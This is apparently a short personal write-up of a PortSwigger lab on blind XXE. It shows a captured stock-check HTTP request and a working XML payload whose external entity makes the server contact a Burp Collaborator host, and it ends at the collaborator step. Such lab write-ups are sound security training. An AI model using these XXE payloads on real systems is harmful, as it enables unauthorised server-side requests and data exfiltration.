---
title: Blind XXE with out-of-band interaction
description: PortSwigger XXE Lab
---
https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Writeup
Check stock request
```http
POST /product/stock HTTP/2
Host: 0a3500c90401471bd1fc72e3008500f1.web-security-academy.net
Cookie: session=V0EKdKHguXIHlllnhcIDXtWlD2CkWAoV
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3500c90401471bd1fc72e3008500f1.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 112
Origin: https://0a3500c90401471bd1fc72e3008500f1.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>banana</productId><storeId>1</storeId></stockCheck>
```

XML value is not reflected in the response.
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid product ID"
```

Payload for out-of-band xxe

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://gau2yglkb5cd6y4jqxekmb9v1m7ev4jt.oastify.com"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

Request to collaborator
